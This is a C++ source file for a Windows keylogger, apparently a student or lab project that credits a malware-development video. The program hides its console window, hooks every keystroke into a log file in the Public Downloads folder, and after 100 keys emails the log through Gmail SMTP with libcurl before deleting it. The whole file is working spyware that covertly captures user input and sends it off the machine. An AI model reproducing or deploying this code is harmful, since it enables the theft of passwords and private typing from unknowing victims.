// Inital keylogger base code which hides as a win function comes from S12 youtube video: https://www.youtube.com/watch?v=ceUVxeq4Eqk&ab_channel=S12-MalwareDevelopment
// email functionality written by z5410231

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <fstream>
#include <curl/curl.h>
#include <string>
#include <stdlib.h>

#define MAX_PAYLOAD_SIZE 1024

int keyCount = 0;
// hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;

        FILE* file;
        fopen_s(&file, "C:\\Users\\Public\\Downloads\\log.txt", "a");
        if (file != NULL) {
            fprintf(file, "%c", vkCode);
            fclose(file);
        }
        keyCount++;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool readLogFile(const char* file_path, char* buffer, size_t buffer_size) {
    FILE* file = fopen(file_path, "rb");
    if (file) {
        size_t bytesRead = fread(buffer, 1, buffer_size, file);
        fclose(file);
        return bytesRead > 0;
    }
    return false;
}

struct upload_status {
  int lines_read;
};

static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp) {
  struct upload_status *upload_ctx = (struct upload_status *)userp;

  if (upload_ctx->lines_read == 0) {
        char buffer[MAX_PAYLOAD_SIZE];

        if (readLogFile("C:\\Users\\Public\\Downloads\\log.txt", buffer, sizeof(buffer))) {
            // Copy the file content to the payload
            size_t len = strlen(buffer);
            memcpy(ptr, buffer, len);
            upload_ctx->lines_read++;
            return len;
        }
    }

  return 0;
}


void send_email_with_attachment(const char *file_path) {
  struct upload_status upload_ctx;
  upload_ctx.lines_read = 0;

  CURL *curl;
  CURLcode res = CURLE_OK;
  struct curl_slist *recipients = NULL;
  const char *url = "smtp://smtp.gmail.com:587";
  const char *mail_from = "<email_here@gmail.com>";
  const char *mail_to = "<email_here@gmail.com>";

  curl = curl_easy_init();
  if(curl) {
    /* Set username and password for login to send email for xfil*/
    curl_easy_setopt(curl, CURLOPT_USERNAME, "email_here@gmail.com");
    curl_easy_setopt(curl, CURLOPT_PASSWORD, "passwordHere!");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, mail_from);

    recipients = curl_slist_append(recipients, mail_to);
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
    curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

    /* Send the message */
    res = curl_easy_perform(curl);

    /* Free the list of recipients */
    curl_slist_free_all(recipients);

    /* Always cleanup */
    curl_easy_cleanup(curl);
  }
}

//  keylogger as winmain function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // creating invisible window
    AllocConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // set hook -> in this instance, record keystrokes from keyboard and send to keyproc function to log
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    // wait for events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg); //win32 function to translate keystrokes
        DispatchMessage(&msg); //win32 function.

        if(keyCount == 100) {
            const char *file_path = "C:\\Users\\Public\\Downloads\\log.txt";
            send_email_with_attachment(file_path);

            // Delete the file after sending the email
            if(remove(file_path) == 0)
                continue;
            else
                continue;
        }
    }
    // delete hook
    UnhookWindowsHookEx(hook);
    return 0;
}
